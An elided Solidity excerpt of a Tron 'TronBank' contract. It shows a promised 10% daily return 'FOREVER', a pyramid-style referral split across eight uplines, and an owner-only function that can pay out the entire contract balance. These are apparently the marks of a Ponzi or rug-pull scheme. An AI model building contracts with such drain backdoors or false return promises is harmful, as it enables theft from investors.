...
contract TronBank {
    ...
    uint private minuteRate = 1057400;      // 10% ROI Daily upto FOREVER
    ...
    function withdraw() public {
        ...
        MarketingFee(msg.sender, players[msg.sender].interestProfit);
    }
    ...
    function MarketingFee(address _receiver, uint _amount) internal {
    ...
    function distributeRef(uint256 _trx, address _affFrom) private{
        ...
        uint256 _allaff = (_trx.mul(50)).div(100);     // 50% Divides into 8 uplines
        ...
        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(40)).div(100);
    ...
    function Marketingf(uint amount) public {
        require(owner == msg.sender);
        uint payout = amount > address(this).balance ? address(this).balance : amount;
